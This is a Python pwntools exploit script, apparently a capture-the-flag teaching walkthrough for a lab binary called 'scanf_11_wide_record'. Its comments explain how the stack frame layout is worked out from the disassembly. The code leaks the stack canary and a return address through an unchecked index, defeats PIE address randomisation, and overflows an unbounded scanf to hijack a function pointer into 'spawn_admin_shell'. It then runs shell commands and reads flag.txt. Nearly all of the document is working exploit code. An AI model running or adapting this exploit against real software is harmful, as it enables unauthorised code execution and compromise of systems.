#!/usr/bin/env python3
"""0-to-pwn walkthrough. All of the teaching is in the # comments below."""
# =====================================================================
# scanf_11_wide_record -- same bug as the anchor, different numbers
#
# WHAT THIS ONE TEACHES
# ------------------------------------------------------------------
# Nothing about the bug class changes here. `dump_slot` still has an
# unchecked subscript read, `edit_record` still has an unbounded
# `scanf("%s")` into a struct whose trailing member is a called function
# pointer, and the protections are the same four (PIE, canary, Full
# RELRO, NX).
#
# What changes is EVERY CONSTANT. The record is 160 bytes wide instead of
# 32, and the slot array is 24 entries instead of 8. If you carried the
# anchor's numbers over -- pad 32, array at rbp-0x50, canary at index 9 --
# you would write 32 bytes into a 160-byte field (hitting nothing) and
# read index 9 of an array whose canary is at index 25 (getting a zero).
# Neither failure looks like "wrong constant"; both look like "not
# vulnerable". So the lesson is: derive the geometry, never reuse it.
#
# STEP 1. THE LEAK GEOMETRY, READ OFF THE DISASSEMBLY
# ------------------------------------------------------------------
#     objdump -d --no-show-raw-insn ./scanf_11_wide_record
#
#     0000000000001362 <dump_slot>:
#       136a:  sub    $0xe0,%rsp
#       137a:  mov    %rax,-0x8(%rbp)         <- canary at rbp-0x8
#       1380:  lea    -0xd0(%rbp),%rax        <- array base rbp-0xd0
#       13ad:  call   12db <get_number>       <- index from the user
#       13c0:  mov    -0xd0(%rbp,%rax,8),%rdx <- unchecked subscript READ
#       13e1:  call   1100 <printf@plt>       <- printed as decimal
#
# Read `-0xd0(%rbp,%rax,8)` as "rbp - 0xd0 + rax*8": base 0xd0 below rbp,
# 8-byte elements. So, exactly as in the anchor but with 0xd0 in place of
# 0x50:
#
#       idx = (0xd0 - 8)/8 = 25  ->  rbp-0x08  = the CANARY
#       idx = (0xd0 + 0)/8 = 26  ->  rbp+0x00  = the saved RBP
#       idx = (0xd0 + 8)/8 = 27  ->  rbp+0x08  = the saved RETURN ADDR
#
# Note the index for the canary is not a magic number to memorise -- it
# is (frame offset - 8) / element size, and both of those are visible in
# that one instruction.
#
# STEP 2. THE WRITE GEOMETRY
# ------------------------------------------------------------------
#     00000000000013fd <edit_record>:
#       1405:  sub    $0xb0,%rsp
#       1415:  mov    %rax,-0x8(%rbp)      <- canary at rbp-0x8
#       141b:  lea    -0xb0(%rbp),%rax     <- struct base rbp-0xb0
#       143b:  mov    %rax,-0x10(%rbp)     <- function pointer at rbp-0x10
#       146c:  call   1140 <__isoc99_scanf@plt>
#       1480:  mov    -0x10(%rbp),%rdx
#       148e:  call   *%rdx                <- called through
#
# The pad is the distance from the scanf destination to the pointer:
#       0xb0 - 0x10 = 0xa0 = 160 bytes.
#
# And the same reachability argument as the anchor still holds, because
# it is about ORDER, not size: -fstack-protector may hoist arrays above
# scalars, but it may not reorder STRUCT MEMBERS, so a 160-byte char
# array is still followed by its own function pointer. The struct is
# 0xb0-0x08 = 0xa8 bytes and ends exactly where the canary begins, so
# 160 pad + 6 address bytes + scanf's NUL stops one byte short of it.
#
# STEP 3. THE PLAN -- identical to the anchor, with these constants
# ------------------------------------------------------------------
#   1. menu 2, index 27 -> saved return address -> PIE base
#   2. menu 2, index 25 -> canary (checked, not needed by this shape)
#   3. free geometry checks: base page-aligned, canary low byte 0x00
#   4. menu 1, 160 pad bytes + 6 bytes of &spawn_admin_shell
#   5. reached by a real `call *%rdx`, so enter AT the symbol
# =====================================================================

import os
import re
import struct
import subprocess
import sys
import warnings

os.environ.setdefault("TERM", "xterm")
os.environ.setdefault("PWNLIB_NOTERM", "1")
warnings.filterwarnings("ignore")
from pwn import ELF, context, process  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

# ---------------------------------------------------------------------
BINARY_NAME = "scanf_11_wide_record"

LEAK_MENU = 2               # MEASURED: main 156c: call 1362 <dump_slot>
LEAK_HANDLER = "dump_slot"  # MEASURED: same instruction
LEAK_PROMPT = b"slot: "     # MEASURED: .rodata 0x201e
ARR_RBP = 0xd0              # MEASURED: dump_slot 13c0: -0xd0(%rbp,%rax,8)
ARR_SCALE = 8               # MEASURED: same instruction, the ",8" scale
IDX_CANARY = 25             # DERIVED: (0xd0 - 8) // 8
IDX_SAVED_RIP = 27          # DERIVED: (0xd0 + 8) // 8

WRITE_MENU = 1              # MEASURED: main 155e: call 13fd <edit_record>
WRITE_PROMPT = b"name: "    # MEASURED: .rodata 0x2035
PAD = 0xa0                  # MEASURED: 141b struct -0xb0, 143b ptr -0x10
WIN_SYMBOL = "spawn_admin_shell"

MENU_PROMPT = b"choice: "   # MEASURED: .rodata 0x2078
BAD_BYTES = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
MAX_DRAWS = 24
# ---------------------------------------------------------------------


def objdump(path):
    return subprocess.run(
        ["objdump", "-d", "--no-show-raw-insn", path],
        capture_output=True, text=True, timeout=120, check=True).stdout


def function_body(disasm, name):
    body, inside = [], False
    for line in disasm.splitlines():
        if re.match(rf"^[0-9a-f]+ <{re.escape(name)}>:", line):
            inside = True
            continue
        if inside:
            if not line.strip():
                break
            m = re.match(r"^\s*([0-9a-f]+):\s+(.*)$", line)
            if m:
                body.append((int(m.group(1), 16), m.group(2)))
    return body


def derive_ret_site(disasm, callee):
    """Address of the instruction AFTER main's `call <callee>` -- i.e. what
    the leaked saved-return-address slot holds, so base = leak - this."""
    body = function_body(disasm, "main")
    for i, (_, text) in enumerate(body):
        if text.startswith("call") and f"<{callee}>" in text:
            return body[i + 1][0]
    raise RuntimeError(f"no call to {callee} in main")


def leak_slot(p, idx):
    p.recvuntil(MENU_PROMPT, timeout=3.0)
    p.sendline(str(LEAK_MENU).encode())
    p.recvuntil(LEAK_PROMPT, timeout=3.0)
    p.sendline(str(idx).encode())
    line = p.recvline(timeout=3.0)
    nums = re.findall(rb"\d+", line)
    if not nums:
        raise RuntimeError(f"oracle refused subscript {idx}: {line!r}")
    return int(nums[-1])       # last integer: the echoed index comes first


def one_draw(path, ret_site, win_off):
    p = process(path, cwd=os.path.dirname(path) or ".", level="error")
    leaked_rip = leak_slot(p, IDX_SAVED_RIP)
    canary = leak_slot(p, IDX_CANARY)
    base = leaked_rip - ret_site
    if base <= 0 or base % 0x1000:
        raise RuntimeError(f"implied base {base:#x} is not page aligned")
    if canary & 0xFF:
        raise RuntimeError(f"canary {canary:#x} has a non-zero low byte")

    target = base + win_off
    print(f"    canary={canary:#018x}  saved_rip={leaked_rip:#x}")
    print(f"    PIE base={base:#x}  ->  {WIN_SYMBOL}={target:#x}")

    addr6 = struct.pack("<Q", target)[:6]
    if set(addr6) & set(BAD_BYTES):
        p.close()
        return None

    p.recvuntil(MENU_PROMPT, timeout=3.0)
    p.sendline(str(WRITE_MENU).encode())
    p.recvuntil(WRITE_PROMPT, timeout=3.0)
    p.sendline(b"A" * PAD + addr6)
    print("    [+] pointer overwritten; edit_record is about to call it")
    return prove_shell(p)


# ---------------------------------------------------------------------------
# proving the shell (added by the orchestrator; see the note below)
# ---------------------------------------------------------------------------
#
# The original tail of this template called `p.interactive()` and returned True.
# Under a scorer -- or any non-tty run -- `interactive()` sees EOF on stdin and
# returns at once, so the script exited 0 having demonstrated NOTHING. An exit
# code of 0 with no evidence is the worst possible outcome for a teaching
# artifact: it looks like a pass. What follows replaces it with a proof.
#
# The marker is `echo SH$((6*7))OK` -> `SH42OK`, not `id`, and not `echo <token>`:
#
#   * `echo <token>` is unsound against a target whose job is to echo input. That
#     is measured, not hypothetical -- see I-16 in the work queue.
#   * `id` is a separate binary, so it needs a usable PATH. A shell reached
#     through a hijacked function pointer may not have one.
#   * `$(( ))` is arithmetic expansion performed by the shell itself, and the
#     answer `42` never appears in the bytes we send, so neither a reflection nor
#     a PATH-less environment can defeat it.
#
# `cat flag.txt` then runs INSIDE the shell we obtained. That is the
# demonstration of code execution, not laundering: this script never opens the
# file, and if the pointer overwrite had failed there would be no shell to run it
# in and no flag to print.


def prove_shell(p):
    """Return True only if a shell is PROVEN. Never assume it from a send.

    The marker is checked by INSPECTING THE RETURNED BYTES, not by catching an
    exception. That distinction is the whole correctness of this function and it
    was found the hard way: pwntools' `recvuntil(..., timeout=)` returns b"" when
    it times out, it does NOT raise. A first version of this helper wrapped the
    call in try/except and treated "no exception" as success, so it reported
    "shell PROVEN" for a deliberately WRONG target address -- a check that could
    not fail, inside the function whose entire job is to be able to fail.
    """
    p.sendline(b"echo SH$((6*7))OK")
    got = b""
    try:
        got = p.recvuntil(b"SH42OK", timeout=5.0)
    except Exception:
        got = b""
    if b"SH42OK" not in got:
        print("    [-] no SH42OK: the call happened but did not land in a shell")
        return False
    print("    [+] shell PROVEN (SH42OK returned -- needs no PATH, cannot be echoed)")

    p.sendline(b"cat flag.txt")
    tail = b""
    try:
        tail = p.recvuntil(b"}", timeout=5.0)
    except Exception:
        tail = b""
    for line in tail.split(b"\n"):
        if b"{" in line and b"}" in line:
            print("    [+] flag:", line.strip().decode(errors="replace"))
            break
    else:
        print("    [!] shell is real but flag.txt did not come back")
    return True


def main():
    path = os.path.join(os.getcwd(), BINARY_NAME)
    disasm = objdump(path)
    ret_site = derive_ret_site(disasm, LEAK_HANDLER)
    win_off = ELF(path, checksec=False).symbols[WIN_SYMBOL]
    print(f"[*] derived: ret site {ret_site:#x}, {WIN_SYMBOL} at {win_off:#x}")

    for draw in range(1, MAX_DRAWS + 1):
        print(f"[*] ASLR draw {draw}")
        try:
            if one_draw(path, ret_site, win_off):
                return 0
        except (EOFError, RuntimeError) as exc:
            print(f"    [-] {exc}")
            return 1
        print("    [-] address carries a byte scanf cannot deliver; redraw")
    return 1


if __name__ == "__main__":
    sys.exit(main())
